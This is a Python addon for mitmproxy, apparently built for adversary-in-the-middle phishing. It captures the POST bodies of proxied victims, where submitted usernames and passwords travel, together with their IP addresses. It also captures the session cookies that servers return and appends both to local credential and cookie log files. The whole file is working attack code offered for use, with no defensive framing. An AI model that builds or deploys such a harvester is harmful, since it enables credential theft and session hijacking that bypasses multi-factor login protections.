from mitmproxy import http
import json
import datetime
import os
import traceback

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
CREDS_DIR = os.path.join(BASE_DIR, "creds")
LOG_CREDENTIALS = os.path.join(CREDS_DIR, "aitm_credentials.json")
LOG_COOKIES = os.path.join(CREDS_DIR, "aitm_cookies.json")

os.makedirs(CREDS_DIR, exist_ok=True)

def convert_bytes(obj):
    """Recursively convert bytes to strings in dictionaries/lists."""
    if isinstance(obj, bytes):
        return obj.decode('utf-8', errors='replace')
    elif isinstance(obj, dict):
        return {convert_bytes(k): convert_bytes(v) for k, v in obj.items()}
    elif isinstance(obj, list):
        return [convert_bytes(i) for i in obj]
    elif isinstance(obj, tuple):
        return tuple(convert_bytes(i) for i in obj)
    else:
        return obj

class AitmLogger:
    def request(self, flow: http.HTTPFlow) -> None:
        try:
            if flow.request.method == "POST":
                data = {}
                if flow.request.urlencoded_form:
                    data = dict(flow.request.urlencoded_form)
                elif flow.request.multipart_form:
                    data = dict(flow.request.multipart_form)
                elif flow.request.text:
                    data = {"raw_body": flow.request.text}
                if data:
                    data = convert_bytes(data)
                    entry = {
                        "timestamp": str(datetime.datetime.now()),
                        "url": flow.request.url,
                        "data": data,
                        "client_ip": flow.client_conn.address[0]
                    }
                    self._append_log(LOG_CREDENTIALS, entry)
        except Exception:
            traceback.print_exc()

    def response(self, flow: http.HTTPFlow) -> None:
        try:
            cookies = flow.response.cookies
            if cookies:
                cookies_dict = {}
                for name, cookie in cookies.items():
                    if hasattr(cookie, 'value'):
                        cookies_dict[name] = cookie.value
                    elif isinstance(cookie, tuple) and len(cookie) > 0:
                        cookies_dict[name] = cookie[0]
                    else:
                        cookies_dict[name] = str(cookie)
                cookies_dict = convert_bytes(cookies_dict)
                entry = {
                    "timestamp": str(datetime.datetime.now()),
                    "url": flow.request.url,
                    "cookies": cookies_dict
                }
                self._append_log(LOG_COOKIES, entry)
        except Exception:
            traceback.print_exc()

    def _append_log(self, filename, entry):
        try:
            os.makedirs(os.path.dirname(filename), exist_ok=True)
            with open(filename, "a") as f:
                f.write(json.dumps(entry) + "\n")
        except Exception:
            traceback.print_exc()

addons = [AitmLogger()]
